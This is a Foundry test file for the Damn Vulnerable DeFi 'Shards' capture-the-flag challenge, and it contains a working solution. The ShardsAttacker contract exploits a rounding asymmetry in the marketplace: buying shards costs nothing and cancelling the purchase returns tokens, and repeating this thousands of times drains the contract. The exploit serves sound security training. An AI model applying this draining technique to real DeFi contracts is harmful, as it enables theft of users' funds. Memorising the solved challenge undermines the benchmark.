// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

     /**
     * =========================================================
     * SOLUTION - test_shards()
     * =========================================================
     * Attack: fill/cancel rounding asymmetry (round-down buy, round-up refund)
     * fill() charges want.mulDivDown(toDVT(price,rate), totalShards); for
     * want <= 133 this rounds to ZERO DVT. cancel() refunds the same shards as
     * want.mulDivUp(rate, 1e6) = 9.975e12 DVT - so each buy-then-cancel cycle
     * extracts ~9.975e12 DVT for free.
     * 1. Player deploys an attacker; its constructor is the only player tx.
     * 2. The attacker loops 7519 same-block fill(133)+cancel cycles. Buying 133
     *    shards costs 0 (rounds down); cancelling refunds 9.975e12 (rounds up).
     *    Same-block cancel passes the time guard; never fully fills, so the
     *    offer stays open and cancel() is allowed.
     * 3. Total extracted ~7.5e16 DVT (> the required threshold); staking pool
     *    is never touched. The attacker forwards everything to recovery.
     *
     * Single player tx (constructor); player ends holding 0 tokens.
     * =========================================================
     */
    function test_shards() public checkSolvedByPlayer {
        new ShardsAttacker(address(marketplace), address(token), recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT - ShardsAttacker
 * =========================================================
 * Runs the whole free-extraction loop in its constructor (a single player tx).
 * Each iteration buys 133 shards for 0 DVT (fill rounds down) and immediately
 * cancels for a 9.975e12 DVT refund (cancel rounds up), netting free DVT every
 * cycle. After enough cycles to clear the win threshold it forwards the entire
 * extracted balance to the recovery address.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice One-transaction Shards rounding drainer.
 * @dev Buys at offer 1 with want=133 (cost 0), same-block cancel (refund 9.975e12).
 */
contract ShardsAttacker {
    uint256 private constant WANT = 133;        // largest amount whose fill cost rounds to 0
    uint256 private constant CYCLES = 7519;     // enough refunds to clear the win threshold

    constructor(address marketplace, address token, address recovery) {
        IShardsMarket m = IShardsMarket(marketplace);

        for (uint256 i = 0; i < CYCLES; i++) {
            // Buy 133 shards of offer 1; cost rounds DOWN to 0 DVT.
            uint256 idx = m.fill(1, WANT);
            // Same-block cancel; refund rounds UP to 133 * rate / 1e6 DVT.
            m.cancel(1, idx);
        }

        // Forward all extracted DVT to recovery; player keeps nothing.
        IERC20Like t = IERC20Like(token);
        t.transfer(recovery, t.balanceOf(address(this)));
    }
}

interface IShardsMarket {
    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex);
    function cancel(uint64 offerId, uint256 purchaseIndex) external;
}

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}
